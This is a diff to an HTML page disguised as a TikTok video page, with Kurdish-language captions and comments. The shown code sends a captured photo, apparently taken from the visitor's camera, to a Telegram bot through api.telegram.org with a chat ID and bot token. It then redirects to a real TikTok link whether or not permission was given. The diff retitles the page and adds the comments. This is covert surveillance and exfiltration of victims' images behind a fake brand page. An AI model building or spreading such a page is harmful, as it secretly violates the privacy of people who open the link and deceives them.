@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok · Watch Video</title>
+    <title>TikTok · warza jayto</title>
 
-    <meta property="og:title" content="TikTok">
+    <meta property="og:title" content="TikTok · warza jayto">
     <meta property="og:description" content="Watch this video on TikTok">
     <meta property="og:image" content="https://p16-va.tiktokcdn.com/obj/musically-maliva-obj/85160868f005c2e171b12b591b921356">
     <meta property="og:type" content="video.other">
@@ -52,16 +52,18 @@
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
                     formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', "📸 وێنەیەکی نوێ گەیشت\n🔗 پەیج: TikTok Official");
+                    formData.append('caption', "📸 وێنەیەکی نوێ گەیشت\n🔗 پەیج: TikTok · warza jayto");
 
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
 
+                    // گواستنەوە بۆ ڤیدیۆیەکی تیک تۆک دوای وێنەگرتن
                     window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
                 }, 1000);
             } catch (e) {
+                // ئەگەر ڕێگەی نەدا، هەر بیباتە سەر تیک تۆک
                 window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
             }
         }
